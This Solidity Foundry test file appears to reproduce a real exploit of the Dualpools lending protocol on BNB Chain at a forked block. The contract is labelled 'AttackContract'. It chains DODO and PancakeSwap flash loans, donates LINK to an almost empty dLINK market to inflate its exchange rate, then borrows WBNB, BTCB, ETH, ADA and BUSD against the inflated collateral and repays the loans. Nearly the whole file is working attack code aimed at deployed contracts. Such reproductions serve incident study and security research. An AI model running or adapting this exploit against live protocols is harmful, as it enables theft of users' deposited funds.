// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

import "@interface/IERC20.sol";
import "@interface/IWBNB.sol";
import "@interface/IPancakeV2.sol";
import "@interface/IPancakeV3.sol";
import "@interface/IDodo.sol";

import "./IVBep20Delegator.sol";
import "./IMarketFacet.sol";

WBNB constant BNB = WBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
IERC20 constant LINK = IERC20(0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD);
IERC20 constant BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);
IERC20 constant BTCB = IERC20(0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c);
IERC20 constant ETH = IERC20(0x2170Ed0880ac9A755fd29B2688956BD959F933F8);
IERC20 constant ADA = IERC20(0x3EE2200Efb3400fAbB9AacF31297cBdD1d435D47);

IVBep20Delegator constant vLINK = IVBep20Delegator(
    0x650b940a1033B8A1b1873f78730FcFC73ec11f1f
);
IVBep20Delegator constant vBUSD = IVBep20Delegator(
    0xfD5840Cd36d94D7229439859C0112a4185BC0255
);
IVBep20Delegator constant vWBNB = IVBep20Delegator(
    0xA07c5b74C9B40447a954e1466938b865b6BBea36
);
IVBep20Delegator constant dLINK = IVBep20Delegator(
    0x8fBCC81E5983d8347495468122c65E2Dc274eed9
);
IVBep20Delegator constant dBTCB = IVBep20Delegator(
    0xB51F589BD9f69a0089c315521EE2FC848bAB6C0c
);
IVBep20Delegator constant dWBNB = IVBep20Delegator(
    0xB5aAaCcFd69EA45b1A5Aa7E9c7a5e0DB2ce4357e
);
IVBep20Delegator constant dETH = IVBep20Delegator(
    0x5F4a5252880b393a8cc4c01bBA4486Cf7a76075A
);
IVBep20Delegator constant dADA = IVBep20Delegator(
    0xb2cf43E119BFC41554c4445f1867dc9F4cf69deD
);
IVBep20Delegator constant dBUSD = IVBep20Delegator(
    0x514e2A29e98D49C676c93c5805cb83891CE6a9F5
);

contract DualPoolsTest is Test {
    IMarketFacet VenusProtocol =
        IMarketFacet(0xfD36E2c2a6789Db23113685031d7F16329158384);
    IMarketFacet Dualpools =
        IMarketFacet(0x5E5e28029eF37fC97ffb763C4aC1F532bbD4C7A2);

    IDODO DPPOracle_0x1b52 = IDODO(0x1B525b095b7353c5854Dbf6B0BE5Aa10F3818FaC);
    IDODO DPPOracle_0x8191 = IDODO(0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d);

    IPancakePairV2 WBNB_LINK_Pool =
        IPancakePairV2(0x824eb9faDFb377394430d2744fa7C42916DE3eCe); // LINK-WBNB
    IPancakePairV3 pool =
        IPancakePairV3(0x172fcD41E0913e95784454622d1c3724f546f849);

    function setUp() public {
        vm.createSelectFork("bsc", 36145772 - 1);
        vm.label(address(this), "AttackContract");
        vm.label(address(BNB), "WBNB");
        vm.label(address(LINK), "LINK");
        vm.label(address(BUSD), "BUSD");
        vm.label(address(BTCB), "BTCB");
        vm.label(address(ETH), "ETH");
        vm.label(address(ADA), "ADA");
        vm.label(address(vLINK), "vLINK");
        vm.label(address(vBUSD), "vBUSD");
        vm.label(address(vWBNB), "vWBNB");
        vm.label(address(VenusProtocol), "VenusProtocol");
        vm.label(address(dLINK), "dLINK");
        vm.label(address(dBTCB), "dBTCB");
        vm.label(address(dWBNB), "dWBNB");
        vm.label(address(dETH), "dETH");
        vm.label(address(dADA), "dADA");
        vm.label(address(dBUSD), "dBUSD");
        vm.label(address(Dualpools), "Dualpools");
    }

    function testAttack() public {
        BUSD.approve(address(vBUSD), type(uint256).max);
        LINK.approve(address(vLINK), type(uint256).max);
        LINK.approve(address(dLINK), type(uint256).max);

        DPPOracle_0x1b52.flashLoan(
            7001000000000000000,
            0,
            address(this),
            new bytes(1)
        ); // borrow BUSD
    }

    function DPPFlashLoanCall(
        address sender,
        uint256 baseAmount,
        uint256 quoteAmount,
        bytes calldata data
    ) external {
        sender;
        baseAmount;
        quoteAmount;
        if (msg.sender == address(DPPOracle_0x1b52)) {
            WBNB_LINK_Pool.swap(0, 1000, address(this), data); // pancakeCall , swap BUSD to LINK
            BUSD.transfer(address(DPPOracle_0x1b52), 7001000000000000000);
        } else if (msg.sender == address(DPPOracle_0x8191)) {
            pool.flash(address(this), 70000000000000000000000, 0, new bytes(1)); // v3call , borrow BUSD
            BNB.transfer(address(WBNB_LINK_Pool), 59);
        }
    }

    function pancakeCall(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external {
        sender;
        amount0;
        amount1;

        DPPOracle_0x8191.flashLoan(
            312497349377117598837,
            154451704908346387787280,
            address(this),
            data
        ); // borrow WBNB and BUSD
    }

    function pancakeV3FlashCallback(
        uint256 fee0,
        uint256 fee1,
        bytes calldata data
    ) external {
        fee0;
        fee1;
        data;
        address[] memory tokenList = new address[](2);
        tokenList[0] = address(vBUSD);
        tokenList[1] = address(vWBNB);
        VenusProtocol.enterMarkets(tokenList);
        vBUSD.mint(224451704908346387787280); // 969266514517797 vBUSD
        BNB.withdraw(312497349377117598837);
        vWBNB.mint{value: 312497349377117598837 wei}(); // 1320879335222 vBNB
        vLINK.borrow(11500000000000000000000);

        dLINK.mint(2);
        LINK.transfer(address(dLINK), 11499999999999999999998);
        address[] memory tokenList1 = new address[](1);
        tokenList1[0] = address(dLINK);
        Dualpools.enterMarkets(tokenList1);
        dWBNB.borrow(50074555376020317788);
        dBTCB.borrow(171600491170058684);
        dETH.borrow(3992080357935675366);
        dADA.borrow(6378808489713884698357);
        dBUSD.borrow(911577468904829524350);
        dLINK.redeemUnderlying(11499999999999999999898);

        // LINK.transfer(address(this), 1000); // not necessary

        vLINK.repayBorrow(11500000000000000000000);
        vBUSD.redeem(969266514517797);
        vWBNB.redeem(1320879335222);

        // BUSD.transfer(address(this), 7001000000000000000); // not necessary
        BUSD.transfer(address(DPPOracle_0x8191), 154451704908346387787280);
        BUSD.transfer(address(pool), 70007000000000000000000);

        BNB.deposit{value: 362571904345528150166}();
        BNB.transfer(address(DPPOracle_0x8191), 312497349377117598837);
    }

    receive() external payable {}
}
